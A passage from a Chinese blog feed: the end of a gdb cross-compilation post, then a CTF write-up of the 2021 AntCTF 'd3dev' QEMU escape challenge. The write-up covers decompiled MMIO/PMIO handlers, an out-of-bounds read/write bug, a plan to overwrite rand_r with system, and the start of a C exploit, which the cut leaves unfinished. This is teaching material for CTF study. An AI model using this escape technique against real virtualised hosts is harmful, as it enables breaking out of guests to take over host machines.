class="line">find . -name <span class="string">"*.cache"</span> | xargs rm -rf</span><br><span class="line">./configure --target=i386-linux  CFLAGS=<span class="string">"-static -m32"</span></span><br><span class="line">make  LDFLAGS+=<span class="string">"-L /home/giantbranch/IOT/Tfuzz/test/i386/usr/local/lib"</span></span><br></pre></td></tr></table></figure><h3 id="1-4-正常编译64位gdb"><a href="#1-4-正常编译64位gdb" class="headerlink" title="1.4 正常编译64位gdb"></a>1.4 正常编译64位gdb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">find . -name <span class="string">"*.cache"</span> | xargs rm -rf</span><br><span class="line">./configure CFLAGS=<span class="string">"-static"</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><h3 id="1-5-查看交叉编译链适配环境"><a href="#1-5-查看交叉编译链适配环境" class="headerlink" title="1.5 查看交叉编译链适配环境"></a>1.5 查看交叉编译链适配环境</h3><p><img src="https://pic.imgdb.cn/item/616be9c62ab3f51d919a9bb3.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://thoughtbot.com/blog/the-magic-behind-configure-make-make-install" target="_blank" rel="noopener">The magic behind configure, make, make install (thoughtbot.com)</a></p><p><a href="https://seisman.github.io/how-to-write-makefile/introduction.html" target="_blank" rel="noopener">makefile介绍 — 跟我一起写Makefile 1.0 文档 (seisman.github.io)</a></p><p><a href="https://sourceware.org/gdb/wiki/BuildingCrossGDBandGDBserver" target="_blank" rel="noopener">BuildingCrossGDBandGDBserver - GDB Wiki (sourceware.org)</a></p><p><a href="https://tsaiyuyan.github.io/2019/05/17/ubuntu-jian-li-gdb-cross-complier-kai-fa-huan-jing/#toc-heading-1" target="_blank" rel="noopener">Ubuntu 建立 gdb cross-complier 開發環境 | YuYan’s blog (tsaiyuyan.github.io)</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/tools/2021/02/16/cross/" target="_blank" rel="noopener">IoT安全研究视角的交叉编译 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在编译gdb和交叉编译gdb的时候学习到的一些东西&lt;/p&gt;
    
    </summary>
    
    
      <category term="gdb 工具" scheme="wood1314.github.io/tags/gdb-%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>qemu初探</title>
    <link href="wood1314.github.io/year/03/07/clgvp3n6e00466n3fa0nn1zbt/"/>
    <id>wood1314.github.io/year/03/07/clgvp3n6e00466n3fa0nn1zbt/</id>
    <published>2021-03-07T10:55:03.000Z</published>
    <updated>2021-03-07T14:23:44.226Z</updated>
    
    <content type="html"><![CDATA[<p>qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。目前qemu出问题比较多的地方以及比赛中出题目的形式都在在设备模拟中。</p><p>所以其实这种题型一般就是关注它描述设备自定义的那个设备结构体还有与这个设备通信的相关函数。</p><a id="more"></a><h2 id="0x01-qemu基础"><a href="#0x01-qemu基础" class="headerlink" title="0x01 qemu基础"></a>0x01 qemu基础</h2><p>主要参考这篇博客吧<a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">qemu-pwn-基础知识 « 平凡路上 (ray-cp.github.io)</a>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p><p>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如<code>IN/OUT</code>访问I/O端口。</p><h3 id="1-1-查看pci设备"><a href="#1-1-查看pci设备" class="headerlink" title="1.1 查看pci设备"></a>1.1 查看pci设备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p><h2 id="0x02-2021-AntCtf-d3dev"><a href="#0x02-2021-AntCtf-d3dev" class="headerlink" title="0x02 2021 AntCtf d3dev"></a>0x02 2021 AntCtf d3dev</h2><h3 id="2-1-设备分析"><a href="#2-1-设备分析" class="headerlink" title="2.1 设备分析"></a>2.1 设备分析</h3><p>首先可以通过d3dev_class_init来判断它是哪个设备，与lspci列表下的设备对比，发现对应设备是<code>/sys/devices/pci0000:00/0000:00:03.0</code></p><p>然后一般来讲，设备的数据类型IDA是没有自动加载的，需要我们手动加载一下。在IDA-&gt;views-&gt;subview-&gt;localtype里搜索 d3 可以找到这个设备结构体，用了这个结构体以后代码就好看很多了。</p><p><img src="/07/clgvp3n6e00466n3fa0nn1zbt/2.png" alt></p><h3 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h3><h4 id="pmio-write"><a href="#pmio-write" class="headerlink" title="pmio_write"></a>pmio_write</h4><p>首先看pmio_write函数，主要功能就四个</p><ul><li>addr为8时设置seek</li><li>addr为28时调用r_rand函数</li><li>addr为4时将key重置</li><li>设置memory_mode</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  uint32_t *v4; // rbp</span><br><span class="line"></span><br><span class="line">  if ( addr == 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( val &lt;= 0x100 )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( addr &gt; 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr == 28 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      do</span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  28LL,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      while ( v4 != (uint32_t *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr == 4 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = 0LL;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[2] = 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pmio-read"><a href="#pmio-read" class="headerlink" title="pmio_read"></a>pmio_read</h4><p>然后再分析pmio_read函数，这个函数朴实无华，功能也十分简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_pmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x18</span> )</span><br><span class="line">    result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = ((__int64 (__fastcall *)(<span class="keyword">void</span> *))((<span class="keyword">char</span> *)dword_7ADF30 + dword_7ADF30[addr]))(opaque);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入到dword_7ADF30之后算一下偏移发现是一串gadget，基本上的功能就是读那个设备结构体的一些值，比如seek，key之类的。</p><h4 id="mmio-write"><a href="#mmio-write" class="headerlink" title="mmio_write"></a>mmio_write</h4><p>这个有一个越界写漏洞，出现在设置v4这个index的时候这个seek是我们自主可控的，因此会造成越界写。还有一点需要注意的就是，它那个do while实际上是一个解密的过程。x是低32位，y是高32位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key0; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key1; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key2; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> x; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> y; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      key0 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      key1 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      key2 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      key3 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      x = v6 + *((_DWORD *)v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      y = ((<span class="keyword">unsigned</span> __int64)v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        x += (i + y) ^ (key1 + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)y &gt;&gt; <span class="number">5</span>)) ^ (key0 + <span class="number">16</span> * y);</span><br><span class="line">        LODWORD(y) = ((i + x) ^ (key3 + (x &gt;&gt; <span class="number">5</span>)) ^ (key2 + <span class="number">16</span> * x)) + y;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i != <span class="number">0xC6EF3720</span> );                <span class="comment">// range(20)</span></span><br><span class="line">      v5[<span class="number">0x15B</span>] = (ObjectClass_0 *)__PAIR64__(y, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="mmio-read"><a href="#mmio-read" class="headerlink" title="mmio_read"></a>mmio_read</h4><p>这个地方跟上面的越界写一样，就是个越界读。然后还会把读出的数据进行一个加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, __int64, <span class="keyword">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">28L</span>L,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="keyword">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0L</span>L;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-利用思路"><a href="#2-3-利用思路" class="headerlink" title="2.3 利用思路"></a>2.3 利用思路</h3><ol><li>利用越界读读出rand_r的地址，算出libc地址</li><li>利用越界写将system地址写入rand_r的位置</li><li>将原来seek的位置以及后面的block写入cat flag命令</li><li>利用pmio_write调用rand_r从而实现命令执行</li></ol><h3 id="2-4-本地调试"><a href="#2-4-本地调试" class="headerlink" title="2.4 本地调试"></a>2.4 本地调试</h3><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.img</span><br></pre></td></tr></table></figure><p>编译写好的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -O0 -o exp -static d3dev.c</span><br></pre></td></tr></table></figure><p>将写好的二进制文件编译后打包入rootfs.img中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><p>然后直接运行它的laungh.sh就行了</p><p>我在20.04的环境下可以直接运行起来,然后<code>ps -ax</code>查看当前有哪些进程，使用gdb attach对应的进程就可以进行相应的调试了</p><blockquote><p>调试时查看结构体可以在d3dev相关函数断点下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;p *((d3devState *)$rdi)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>就可以查看了</p></blockquote><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc040</span>; <span class="comment">//cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span></span><br><span class="line"><span class="keyword">uint32_t</span> keys[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint64_t</span> libc_base ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_arbread</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset_keys</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> seed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        keys[i] = rand_r(&amp;seed);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"keys[%d] test = %p\n"</span>,i, keys[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    pmio_write(<span class="number">28</span> + pmio_base,<span class="number">0</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span> + pmio_base,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_seek_off</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(<span class="number">8</span> + pmio_base,offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> x, <span class="keyword">uint64_t</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        i -=<span class="number">0x61C88647</span>;</span><br><span class="line">        x += (i + y) ^ ( ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)y &gt;&gt; <span class="number">5</span>)) ^ (  y &lt;&lt; <span class="number">4</span>);</span><br><span class="line">        y = 